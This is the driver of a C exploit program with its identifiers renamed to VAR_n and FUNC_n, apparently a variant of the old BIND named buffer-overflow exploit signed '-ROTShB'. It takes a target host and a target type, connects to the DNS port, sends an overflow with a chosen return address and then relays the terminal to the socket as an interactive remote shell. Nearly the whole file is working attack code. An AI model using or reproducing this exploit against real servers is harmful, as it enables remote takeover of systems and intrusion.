
typedef unsigned long size_t;
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;

typedef int bool;




typedef struct TYPE_5__ TYPE_2__ ;
typedef struct TYPE_4__ TYPE_1__ ;


typedef int ybuf ;
typedef int xbuf ;
struct TYPE_5__ {int s_addr; } ;
struct sockaddr_in {TYPE_2__ sin_addr; int sin_family; int sin_port; } ;
struct sockaddr {int dummy; } ;
typedef int sa ;
typedef int fd_set ;
struct TYPE_4__ {int addr; int opt_addr; char* desc; int fd; } ;


 int VAR_0 ;
 unsigned long VAR_1 ;
 int VAR_2 ;
 int VAR_3 ;
 scalar_t__ FUNC_0 (int,int *) ;
 int FUNC_1 (int,int *) ;
 int FUNC_2 (int *) ;
 int VAR_4 ;
 void* FUNC_3 (char*) ;
 int FUNC_4 (int,TYPE_1__,unsigned long,int) ;
 int FUNC_5 (int) ;
 int FUNC_6 (int,struct sockaddr*,int) ;
 int FUNC_7 (int) ;
 int FUNC_8 (int ) ;
 int FUNC_9 (int ,char*,...) ;
 int FUNC_10 (int) ;
 char* FUNC_11 (TYPE_2__) ;
 int FUNC_12 (char*) ;
 int FUNC_13 (char*,...) ;
 int FUNC_14 (int,char*,int) ;
 int FUNC_15 (char*) ;
 int FUNC_16 (int,int *,int *,int *,int *) ;
 int FUNC_17 (int ,int ,int ) ;
 int VAR_5 ;
 int VAR_6 ;
 int VAR_7 ;
 TYPE_1__* VAR_8 ;
 int FUNC_18 (int,char*,int) ;

int FUNC_19(int VAR_9, char *VAR_10[])
{
  char VAR_11[128], VAR_12[128];
  unsigned long VAR_13=VAR_1;
  int VAR_14, VAR_15=VAR_2, VAR_16, VAR_17;
  int VAR_18=0, VAR_19=0;
  fd_set VAR_20, VAR_21;
  struct sockaddr_in VAR_22;

  for(VAR_17=0;((VAR_8[VAR_17].addr)||(VAR_8[VAR_17].opt_addr));VAR_17++);

  if(VAR_9<2)
    {
      (void)FUNC_9(VAR_5,"\ntarget types:\n");

      for(VAR_14=0;VAR_14<VAR_17;VAR_14++)
        (void)FUNC_9(VAR_5," %-2d : %s\n",VAR_14,VAR_8[VAR_14].desc);

      (void)FUNC_9(VAR_5,"\nerror: usage: %s <host> [tt] [opt] [ofst]\n",
                    VAR_10[0]);
      FUNC_7(-1);
    }

  if(VAR_9>2)
    {
      VAR_14 = FUNC_3(VAR_10[2]);
      if((VAR_14<0)||(VAR_14>VAR_17))
        {
          (void)FUNC_9(VAR_5,"error: invalid target type %d\n",VAR_14);
          FUNC_7(-1);
        }
    }
  else
    VAR_14 = VAR_3;

  if(VAR_9>3)
    {
      VAR_15 = FUNC_3(VAR_10[3]);
      if((VAR_15!=0)&&(VAR_15!=1))
        {
          (void)FUNC_9(VAR_5,"error: invalid optimization setting %d\n",VAR_15);
          FUNC_7(-1);
        }
    }

  if(VAR_9>4)
    VAR_13 = FUNC_3(VAR_10[4]);


  if(!(VAR_22.sin_addr.s_addr=FUNC_15(VAR_10[1])))
    {
      (void)FUNC_9(VAR_5,"error: can not resolve: %s\n",VAR_10[1]);
      FUNC_7(-1);
    }

  VAR_22.sin_family = VAR_0;
  VAR_22.sin_port = FUNC_10(53);

  if((VAR_16=FUNC_17(VAR_22.sin_family,VAR_4,0))==(-1))
    {
      (void)FUNC_12("error: socket");
      FUNC_7(-1);
    }

  if(FUNC_6(VAR_16,(struct sockaddr *)&VAR_22,sizeof(VAR_22))==(-1))
    {
      (void)FUNC_12("error: connect");
      FUNC_7(-1);
    }

  (void)FUNC_13("target             : %s\n",FUNC_11(VAR_22.sin_addr));
  (void)FUNC_13("target type        : %s\n",VAR_8[VAR_14].desc);
  (void)FUNC_13("optimized named    : %s\n",(VAR_15?"YES":"NO"));
  (void)FUNC_13("anbuff addr        : 0x%x\n",(unsigned int)
               (VAR_17=(VAR_15?VAR_8[VAR_14].opt_addr:VAR_8[VAR_14].addr)));
  (void)FUNC_13("anbuff addr offset : %lu\n",VAR_13);
  (void)FUNC_13("ret addr           : 0x%x\n",(unsigned int)(VAR_17+VAR_13));
  (void)FUNC_13("fd to make dups of : %d\n",VAR_8[VAR_14].fd);

  (void)FUNC_13("here we go...\n");

  switch(FUNC_4(VAR_16,VAR_8[VAR_14],VAR_13,VAR_15))
    {
    case -1:
      (void)FUNC_12("error: attack");
      FUNC_7(-1);
      break;

    case 0:
      (void)FUNC_9(VAR_5,"error: internal error\n");
      FUNC_7(-1);
      break;
    }

  (void)FUNC_13("have fun.\n");
  (void)FUNC_13("-ROTShB\n");

  while(1)
    {
      FUNC_2(&VAR_20);
      if(VAR_19<(sizeof(VAR_12)-1))
        FUNC_1(VAR_16,&VAR_20);
      if(VAR_18<(sizeof(VAR_11)-1))
        FUNC_1(FUNC_8(VAR_6),&VAR_20);

      FUNC_2(&VAR_21);
      if(VAR_18)
        FUNC_1(VAR_16,&VAR_21);
      if(VAR_19)
        FUNC_1(FUNC_8(VAR_7),&VAR_21);

      if((VAR_14=FUNC_16((VAR_16+1),&VAR_20,&VAR_21,((void*)0),((void*)0)))==(-1))
        {
          (void)FUNC_12("error: select");
          break;
        }

      if(FUNC_0(FUNC_8(VAR_6),&VAR_20))
        {
          if((VAR_17=FUNC_14(FUNC_8(VAR_6),(VAR_11+VAR_18),(sizeof(VAR_11)-VAR_18)))==(-1))
            {
              (void)FUNC_12("error: read");
              FUNC_7(-1);
            }
          else if(VAR_17==0)
            break;

          VAR_18 += VAR_17;
          if(!(--VAR_14)) continue;
        }


      if(FUNC_0(VAR_16,&VAR_21))
        {
          if(FUNC_18(VAR_16,VAR_11,VAR_18)!=VAR_18)
            {
              (void)FUNC_12("error: write");
              FUNC_7(-1);
            }

          VAR_18 = 0;
          if(!(--VAR_14)) continue;
        }

      if(FUNC_0(VAR_16,&VAR_20))
        {
          if((VAR_17=FUNC_14(VAR_16,(VAR_12+VAR_19),(sizeof(VAR_12)-VAR_19)))==(-1))
            {
              (void)FUNC_12("error: read");
              FUNC_7(-1);
            }
          else if(VAR_17==0)
            break;

          VAR_19 += VAR_17;
          if(!(--VAR_14)) continue;
        }

      if(FUNC_0(FUNC_8(VAR_7),&VAR_21))
        {
          if(FUNC_18(FUNC_8(VAR_7),VAR_12,VAR_19)!=VAR_19)
            {
              (void)FUNC_12("error: write");
              FUNC_7(-1);
            }

          VAR_19 = 0;
          if(!(--VAR_14)) continue;
        }
    }

  if(FUNC_5(VAR_16)==(-1))
    {
      (void)FUNC_12("error: close");
      FUNC_7(-1);
    }

  FUNC_7(0);
}
